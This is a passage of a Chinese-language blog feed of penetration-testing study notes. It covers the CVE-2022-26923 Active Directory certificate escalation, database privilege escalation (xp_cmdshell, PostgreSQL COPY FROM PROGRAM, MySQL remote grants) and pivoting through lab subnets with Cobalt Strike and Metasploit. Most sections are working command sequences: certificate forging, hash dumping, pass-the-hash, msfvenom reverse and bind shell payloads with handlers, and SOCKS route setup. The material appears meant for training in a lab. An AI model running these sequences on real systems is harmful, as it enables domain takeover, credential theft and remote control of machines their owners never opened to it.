href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#46;&#50;&#x31;">&#97;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#46;&#50;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</p><h2 id="WIN-AD域控提权-CVE-2022-26923"><a href="#WIN-AD域控提权-CVE-2022-26923" class="headerlink" title="WIN-AD域控提权-CVE-2022-26923"></a>WIN-AD域控提权-CVE-2022-26923</h2><p>三个利用文件</p><p>在kali203中使用可能会冲突，用kali2022版本可以解决</p><p>前提条件：</p><p>1、一个域内普通账号</p><p>2、域内存在证书服务器</p><p>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts</p><p>192.168.3.111 xiaodi.local</p><p>192.168.3.111 xiaodi-DC-CA</p><p>192.168.3.111 DC.xiaodi.local</p><p>获取CA结构名和计算机名</p><p>certutil -config - -ping</p><p>域内信息</p><p>192.168.3.111</p><p>test Pass123&#x2F;&#x2F;test用户属于域内普通用户组</p><p>xiaodi-DC-CA&#x2F;&#x2F;CA名称</p><p>DC.xiaodi.local&#x2F;&#x2F;计算机名称</p><p>攻击机执行&#x2F;三个利用目录，记得切换</p><p>1、申请证书：（Certipy）</p><p>certipy req ‘域&#x2F;test:Pass123@域控名字’ -ca xiaodi-DC-CA -template User -debug</p><p>certipy req ‘xiaodi.local&#x2F;test:<a href="mailto:&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#64;&#x44;&#x43;&#46;&#x78;&#x69;&#97;&#x6f;&#100;&#x69;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#64;&#x44;&#x43;&#46;&#x78;&#x69;&#97;&#x6f;&#100;&#x69;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;</a>‘ -ca xiaodi-DC-CA -template User -debug</p><p>这步操作会保存一个test.pfx文件</p><p>2、检测证书（Certipy）</p><p>certipy auth -pfx test.pfx</p><p>3、添加用户：（bloodyAD）</p><p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.3.111 addComputer pwnmachine ‘CVEPassword1234*’</p><p>4、设置属性：（bloodyAD）</p><p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.3.111 setAttribute ‘CN&#x3D;pwnmachine,CN&#x3D;Computers,DC&#x3D;xiaodi,DC&#x3D;local’ dNSHostName ‘[“DC.xiaodi.local”]’</p><p>5、申请证书：（Certipy）</p><p>certipy req ‘xiaodi.local&#x2F;pwnmachine$:CVEPassword1234*@192.168.3.111’ -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug&#x2F;&#x2F;该步骤不成功就换个Certipy-main目录执行</p><p>6、检测证书：（Certipy）</p><p>certipy auth -pfx .&#x2F;dc.pfx -dc-ip 192.168.3.111</p><p>最后会给一个hash值</p><p>7、获取HASH：（impacket）</p><p>python3 secretsdump.py ‘xiaodi.local&#x2F;dc$@DC.xiaodi.local’ -hashes :b6046c1026699b59301ff66341838df4</p><p>8、利用HASH：（impacket）</p><p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#x31;&#49;&#x31;">&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#x31;&#49;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库提权</title>
      <link href="/2024/10/08/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/08/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库提权流程：</p><p>1、先获取到数据库用户密码&#x2F;&#x2F;一般就是拿shell翻配置文件</p><p>-网站存在SQL注入漏洞</p><p>-数据库的存储文件或备份文件</p><p>-网站应用源码中的数据库配置文件</p><p>-采用工具或脚本爆破(需解决外联问题)</p><p>2、利用数据库提权项目进行连接</p><p>java启动</p><p>Databasetools</p><p>RequestTemplate</p><p>java启动</p><p><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></p><p><a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a></p><p><a href="https://github.com/1n7erface/RequestTemplate">https://github.com/1n7erface/RequestTemplate</a></p><p>3、可利用建立代理解决不支持外联</p><p>-利用已知Web权限建立代理（等同于本地连接）</p><p>-利用已知权限执行SQL开启外联（让数据库支持外联）</p><p>&#x2F;&#x2F;mysql </p><p>GRANT ALL PRIVILEGES ON *.*TO’帐号‘@’%’ IDENTIFIED BY’密码’ WITH GRANT OPTION;</p><p>flush privileges;</p><p>&#x2F;&#x2F;</p><p>EXEC sp_configure ‘show advanced options’,1;</p><p>RECONFIGURE;</p><p>EXEC sp_configure ‘Ad Hoc Distributed Queries’,1;</p><p>RECONFIGURE;</p><p>ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE&#x3D;EXCLUSIVE SCOPE&#x3D;SPFILE;</p><p>SHUTDOWN IMMEDIATE;</p><p>STARTUP;</p><p>4、可利用数据库提权类型条件及技术</p><h3 id="MYSQL：PHP-MYSQL-以web入口提权"><a href="#MYSQL：PHP-MYSQL-以web入口提权" class="headerlink" title="-MYSQL：PHP+MYSQL 以web入口提权"></a>-MYSQL：PHP+MYSQL 以web入口提权</h3><p>条件：ROOT密码（高版本的-secure-file-priv没进行目录限制）&#x2F;&#x2F;secure-file-priv&#x3D;“d:”这种就只能在d盘内进行提权</p><p>技术：UDF MOF 启动项 反弹Shell &#x2F;&#x2F;MOF2008之后就没了</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96">https://www.sqlsec.com/2020/11/mysql.html#%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96</a></p><h3 id="MSSQL：-NET-MSSQL-以web入口提权-win特有"><a href="#MSSQL：-NET-MSSQL-以web入口提权-win特有" class="headerlink" title="-MSSQL：.NET+MSSQL 以web入口提权 &#x2F;&#x2F;win特有"></a>-MSSQL：.NET+MSSQL 以web入口提权 &#x2F;&#x2F;win特有</h3><p>条件：sa密码</p><p>技术：xp_cmdshell sp_oacreate CLR 沙盒</p><p><a href="https://www.cnblogs.com/bonelee/p/15864534.html">https://www.cnblogs.com/bonelee/p/15864534.html</a></p><p>xp_cmdshell</p><p>xp_cmdshell 扩展存储过程将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。</p><p><font style="color:rgb(0, 0, 0);background-color:rgb(238, 238, 238);">SQL Server 2005中的xp_cmdshell<br></font><font style="color:rgb(0, 0, 0);background-color:rgb(238, 238, 238);">        由于存在安全隐患，所以在SQL Server 2005中， xp_cmdshell 默认是关闭的。<br></font>        此时，如果执行 xp_cmdshell 将会提示服务未开启：</p><ol><li>getshell或者存在sql注入并且能够执行命令。</li><li>sql server是system权限，sql server默认就是system权限。</li></ol><p>sp_oacreate </p><h3 id="Oracle：（站库分离，非JSP，直接数据库到系统等）"><a href="#Oracle：（站库分离，非JSP，直接数据库到系统等）" class="headerlink" title="-Oracle：（站库分离，非JSP，直接数据库到系统等）"></a>-Oracle：（站库分离，非JSP，直接数据库到系统等）</h3><p>一般oracle和jsp、java结合的多，拿到就是高权限，再从oracle从低权限到高权限太鸡肋</p><p>条件：数据库用户密码</p><p>技术：DBA，普通用户，注入模式</p><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="-PostgreSQL"></a>-PostgreSQL</h3><p>Web到系统</p><p>条件：数据库用户密码</p><p>技术：CVE-2019-9193 UDF libc&#x2F;&#x2F;现阶段是15、16版本，libc利用是8.2版本之前比较老</p><p>复现镜像：</p><p><a href="https://market.aliyun.com/products/56024006/cmjj016247.html">https://market.aliyun.com/products/56024006/cmjj016247.html</a></p><p>DROPTABLEIF EXISTS cmd_exec;</p><p>CREATE TABLEcmd_exec(cmd_output text);</p><p>COPY cmd_exec FROM PROGRAM ‘id’;</p><p>SELECT* FROM cmd_exec;</p><h3 id="Redis-linux特有-win也能装"><a href="#Redis-linux特有-win也能装" class="headerlink" title="-Redis  &#x2F;&#x2F;linux特有 win也能装"></a>-Redis  &#x2F;&#x2F;linux特有 win也能装</h3><p>端口：6379</p><p>数据库到Linux</p><p>条件：利用未授权或密码连接后执行</p><p>见第78天课程内容-只适用Linux</p><p>技术：写密钥ssh 计划任务 反弹shell CVE2022沙盒执行</p><p>使用MUDT的时候计划任务常用、密钥ssh和反弹shell会出现问题</p><p>计划任务&#x2F;var&#x2F;spool&#x2F;cron下</p><p>复现搭建：</p><p>wget <a href="http://download.redis.io/releases/redis-2.8.17.tar.gz">http://download.redis.io/releases/redis-2.8.17.tar.gz</a></p><p>tar xzf redis-2.8.17.tar.gz</p><p>cd redis-2.8.17</p><p>make</p><p>cd src</p><p>&#x2F;redis-server</p><h3 id="Memcached"><a href="#Memcached" class="headerlink" title="-Memcached"></a>-Memcached</h3><p>端口：11211</p><p>数据库到Linux</p><p>条件：设置远程可访问或取得本地权限后访问</p><p>是一套常用的key-value缓存系统，由于它本身没有权限控制模块，</p><p>服务被攻击者扫描发现，通过命令交互可直接读取memcache中的敏感信息。</p><p>复现镜像：</p><p><a href="https://market.aliyun.com/products/56024006/cmjj017529.html">https://market.aliyun.com/products/56024006/cmjj017529.html</a></p><p>案例参考：</p><p><a href="https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg">https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg</a></p><p>开启命令：</p><p>systemctl start memcached.service</p><p>关闭命令：</p><p>systemctl stop memcached.service</p><p>查看状态：</p><p>systemctl status memcached.service</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层代理搭建</title>
      <link href="/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/"/>
      <url>/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597391301-ac95713a-2f99-4b91-8409-1f64d33d30fe.png"></p><p>NAT        139.0模拟出网段</p><p>vmware2    2.0 模拟内网段1</p><p>vmware3    3.0 模拟内网段2</p><p>vmware4    4.0 模拟内网段3</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597978005-f727b176-c021-4545-aa52-05acb2da6765.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598064353-94352ced-4af6-4e63-822a-1313d6f82e25.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598092118-2d1bc42a-ca41-4ea6-99ee-66756d6cbf82.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598096983-bfdd30d4-e973-4d93-b742-52c713dd1891.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598101499-a9b79041-61d0-464c-8fa1-8f098dadbd1b.png"></p><p>服务器需要把网卡2，3，4全部禁用</p><h3 id="cs演示"><a href="#cs演示" class="headerlink" title="cs演示"></a>cs演示</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614811566-ac2a9254-43f3-4fef-bf15-93ddc98142a6.png"></p><p>上线</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612073706-d94e2943-110f-42f9-8a2a-599879f86e0a.png"></p><p>代理</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614855176-a830e504-b486-440c-8188-c10d28782a45.png"></p><p>建立节点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614866336-3dd78c9a-7b24-4492-80f8-819403627ed9.png"></p><p>注意端口是cs服务器端口</p><p>然后代理服务器</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612305228-2ac125e2-0372-471d-9785-c805929ac90f.png"></p><p>选4a扩展</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614953855-ca5d29c6-9164-4177-bc3e-9f4176809892.png"></p><p>测试一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614969731-8fd92125-3478-43de-8a92-317e7b9c845d.png"></p><p>再加规则</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612549574-0b085cb1-400e-4e18-a90d-e03cc0efdb83.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615005316-051de770-2f6a-4231-9388-208b2bbd2dbc.png"></p><p>测试成功</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612811637-bc50caec-f473-409f-9292-bd35bab8ed02.png"></p><p>这个时候在攻击机win上fscan一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615081496-ebe95fa7-bc8e-4f15-b385-fd545fd27ecb.png"></p><p>现在开始往192.168.2.22移动</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616003616-e4603ac7-4a0d-4abf-a50c-376f1e26fa46.png"></p><p>看到没有ip<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616034675-7b1a3e99-30a5-47ac-a0b5-4c18daa023f4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616389453-8bb0c833-b9f0-4664-a031-c699ddc690b6.png"></p><p>传到sql机器上，然后sql机器运行exe，</p><p>发现sql机器4444端口监听</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616603320-93ed0c06-197e-4045-a093-3516b4d54da8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616670409-6291dd85-1e84-48c4-96fd-f78b456c3003.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616691591-2265172d-08c0-4ebc-b48d-1bde4f7451ba.png"></p><p>在2.22服务器上再来一次socket代理，还是c2服务器的ip</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617230971-8319e350-1271-4016-baf6-b56fb5a6e9ea.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617267483-d3c43f8e-18af-49de-8573-16936cebd216.png"></p><p>攻击机能访问到</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617302027-75a0e459-221c-44b4-bbf7-cce596ae57f1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617388779-3b1f8323-ffd8-4558-a3d8-4c79735eaf26.png"></p><p>然后也是不能反向，接着正向链接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618095091-1fdf9d21-8ab0-45ec-8b9e-dbafeaffbcbe.png"></p><p>然后要通4.22，就要在3.22的基础上在sock</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618208549-c93a9757-2794-49fd-adbb-01a076e59d61.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618258339-4b7a43d9-f093-4bd4-82de-8a892d89db53.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618361704-e51ec4d8-e9ec-4950-818e-1c9bc45d96dd.png"></p><p>成功</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618846346-eb6cc5b8-a647-490f-80fd-a412260fe218.png"> </p><h3 id="msf演示"><a href="#msf演示" class="headerlink" title="msf演示"></a>msf演示</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750098640-8cd02866-23f4-44b0-a6bb-813b38439318.png"></p><p>rename成3333.exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750758111-764dbce3-bfe2-4765-8399-3b013439d0d1.png"></p><p>msf配置一下攻击exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750955349-24d3b6b9-3917-4d3a-a65e-b19eb5904141.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751067472-f4e0de94-29ad-4601-bfd4-beee7dd694db.png"></p><p>上线</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751104085-1291c6be-4e5b-4817-a297-bb6cebabf7ed.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751699344-267f2b77-094b-4099-a63b-ddec156d034e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751588615-c218bf9d-ef2f-4a7a-8eb1-c52561519683.png"></p><p>获取路由，看到2网段被添加</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751155888-ded59b85-a070-45f3-a47e-3e9159089d5e.png"></p><p>创建socks节点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751372819-00a56ca6-d302-4e35-be1a-b5522528798d.png"></p><p>绑定4444端口</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751386773-c633237c-d0f5-4129-82fc-43e22d6cdd79.png"></p><p>job可以查看，此时proxifer也可以连，但是介绍proxychains</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751425674-154c14b8-4ac5-4064-8e72-756f56ae4be8.png"></p><p>修改下配置文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751938613-0c33a4ab-adae-4ad5-af07-2f27af08d38d.png"></p><p>可以看到访问到了2.22的web服务</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752140181-0f13faf7-3ba1-4c5b-917a-b7e46d9dbff7.png"></p><p>这里注意nmap扫不出来，因为协议问题，socks代理不出来</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752332292-83297104-3015-4e39-b6e3-00160500a56e.png"></p><p>在此之后的因为无法直接访问，需要生成正向后门</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752529164-5d23a7d4-c89e-460b-bfa1-f67135aaaa3a.png"></p><p>设置正向链接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752728636-85c9205b-86fa-4f49-9d3f-df4fbc59db72.png"></p><p>设置刚才正向要链接的端口地址，run</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752825727-062fa586-c3a8-43de-94ef-0fceb221fe9e.png"></p><p>再设置代理，background返回，用代理模块，这里注意在设置之前注意设置的是session2，就要在sessions 2中把路由信息添加</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753072321-60f39b33-daf7-40e8-9ee4-d789cfaeb258.png"></p><p>操作之后，在sessions2中看到3网段被添加了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753109377-51cb82ea-fd7f-452e-8541-320ffaeb7940.png"></p><p>再添加代理</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753163289-543a97f2-d179-46ff-988f-5c3615893c6d.png"></p><p>可以访问到3.22</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753326387-7897dcd2-1a8c-41eb-8e95-2940e3dbb76e.png"></p><p>同样的操作</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753459262-2aa835fe-215d-4ff7-b947-fbae4f8f91fa.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753839783-a9a7b599-778f-4a18-9da9-109adecd4159.png"></p><p>添加路由</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753905250-ba4a8a0c-ecb7-4762-a163-49072f3c6356.png"></p><p>然后设置代理模块</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754057908-aacbe4aa-4b2f-4ace-817b-67e32618b690.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754042506-3924a55e-efc6-4d3a-bd8b-20f02f0e7063.png"></p><p>测试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754107964-950347ef-5386-473c-a5d8-fe00df8211fe.png"></p><p>同理再上线4.22，正向的时候可以用一个exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754329683-27a4f6e3-d4b7-4cf6-9b3b-82959fc9403a.png"></p><p>这里设置一样，中间代理卡了一次重新搭了一次，又从4567会话开始搭建</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734755548263-b9db2142-8a8f-4e88-b54e-f6c91ad6141f.png"></p><h3 id="SockS配置-网络不可达-通讯解决"><a href="#SockS配置-网络不可达-通讯解决" class="headerlink" title="SockS配置-网络不可达-通讯解决"></a>SockS配置-网络不可达-通讯解决</h3><p>解决：信息收集打点和漏洞利用部分</p><p>注意：配置连接IP为C2服务器IP</p><p>工具：Proxifier Proxychains等</p><h4 id="Proxifier使用："><a href="#Proxifier使用：" class="headerlink" title="Proxifier使用："></a>Proxifier使用：</h4><p>图形化操作</p><h4 id="Proxychains使用："><a href="#Proxychains使用：" class="headerlink" title="Proxychains使用："></a>Proxychains使用：</h4><p>加入修改配置： &#x2F;etc&#x2F;proxychains4.conf</p><p>最下面</p><p>socks5 127.0.0.1 8989</p><p>如果是4a就是</p><p>socks4a 127.0.0.1 8989 </p><p>调用加载测试： proxychains4 curl <a href="http://192.168.2.22/">http://192.168.2.22</a></p><p>C2平台：MSF&#x2F;CS&#x2F;Sliver&#x2F;Viper等</p><p>实现步骤：</p><p>1、在被控机器上获取下一级网段</p><p>2、在被控及其上建立SockS节点</p><p>3、在工具上配置连接属性和规则触发</p><h3 id="正反向监听-网络不可达-C2上线"><a href="#正反向监听-网络不可达-C2上线" class="headerlink" title="正反向监听-网络不可达-C2上线"></a>正反向监听-网络不可达-C2上线</h3><p>C2平台：MSF&#x2F;CS&#x2F;Sliver&#x2F;Viper等</p><p>实现步骤：</p><p>反向监听器：reverse</p><p>正向监听器：bind（需主动连接）</p><p>CS操作：</p><p>直接-图形化操作</p><p>MSF操作命令：</p><h4 id="配置反向上线："><a href="#配置反向上线：" class="headerlink" title="配置反向上线："></a>配置反向上线：</h4><p>生产的后门在&#x2F;root目录下</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p><p>msfconsole：</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>show options 看一下设置选项</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>run</p><h4 id="查看路由表："><a href="#查看路由表：" class="headerlink" title="查看路由表："></a>查看路由表：</h4><p>run autoroute -p</p><p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p><p>查看完记得输入background跳出会话</p><h4 id="创建socks节点："><a href="#创建socks节点：" class="headerlink" title="创建socks节点："></a>创建socks节点：</h4><p>use auxiliary&#x2F;server&#x2F;socks_proxy</p><p>show options</p><p>只用设置版本和端口（默认5）</p><p>设置完要run</p><h4 id="配置正向上线："><a href="#配置正向上线：" class="headerlink" title="配置正向上线："></a>配置正向上线：</h4><p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;xx -f exe -o msf.exe</p><p>msfconsole:</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p><p>set rhost xx.xx.xx.xx</p><p>set lport 6666</p><p>run</p><p>主动链接  xx.xx.xx.xx：6666</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768803502-aab59ed0-9d7a-4b0e-b422-e74eb2333609.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768793189-4b0eab75-a95d-408d-8f8c-9435de96db0f.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770686286-a22a5e28-7b1e-4811-a860-0bf4d6000785.png"></p><p>全部启用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770783583-242f228f-0b98-48ee-9908-c903367e620a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770845216-7383e853-e345-41cc-9464-cc4ddda06faa.png"></p><p>绿色是放行，未绿色标识不放行</p><p>防火墙策略-入站规则&amp;出站规则&amp;自定义</p><p>1、防火墙默认入站&amp;出站策略</p><p>2、防火墙自定义入站&amp;出站策略</p><p>内网域防火墙同步策略：</p><p>操作：组策略管理-域-创建GPO链接-防火墙设置</p><p>更新策略：强制&amp;命令&amp;重启</p><p>命令：gpupdate&#x2F;force</p><p>限制端口分为： 入站限制端口、出站限制端口、出入站均限制端口。</p><p>入站限制端口，出站未限制端口，使用反向连接。</p><p>出站限制端口，入站未限制端口，使用正向连接。</p><p>出入站均限制端口，使用端口绕过进行连接，建议配合反向连接。</p><p>限制协议分为：</p><p>入站限制、出站限制、出入均限制，限制又分为：单协议限制、多协议限制、全部限制。</p><h3 id="入站限制："><a href="#入站限制：" class="headerlink" title="入站限制："></a>入站限制：</h3><p>单协议限制，使用其它协议或者反向连接绕过。（隧道技术）</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771145479-35177ec4-3f01-459e-880f-bcb39de47f1a.png">这种情况就是先反向连2.11，在正向连2.22</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771408616-1e293ad7-8f9d-4bcd-94fd-47f58c953cc3.png"></p><p> 这种情况因为sql上有web服务，如果要访问的话还需要配置入站规则。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771786168-c23e77b4-ea6b-4bb9-92ca-a91663bcd3cd.png"></p><p>新建</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771865213-f5fdd4df-6d86-45e3-9dd5-1c01ffdc2e07.png"></p><p>加80端口之后</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771968145-0ebe75a6-68b0-4e59-84d5-5a604ad83cc1.png"></p><p>这里让2.22反向给2.11，此时对转发上线</p><p><img 